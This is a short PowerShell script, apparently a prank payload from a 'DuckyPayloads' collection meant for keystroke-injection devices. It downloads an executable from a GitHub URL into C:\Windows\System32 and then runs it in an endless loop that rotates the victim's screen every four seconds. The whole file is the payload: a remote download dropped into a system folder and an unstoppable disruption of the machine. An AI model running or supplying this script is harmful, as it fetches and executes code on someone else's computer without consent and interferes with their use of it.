Invoke-WebRequest -Uri 'https://github.com/chaos511/DuckyPayloads/raw/master/flipscreen/programs/display64.exe' -OutFile C:\Windows\System32\display64.exe
while ($true){
Start-Sleep -s 4
display64.exe /rotate:0
Start-Sleep -s 4
display64.exe /rotate:90
Start-Sleep -s 4
display64.exe /rotate:180
Start-Sleep -s 4
display64.exe /rotate:270
}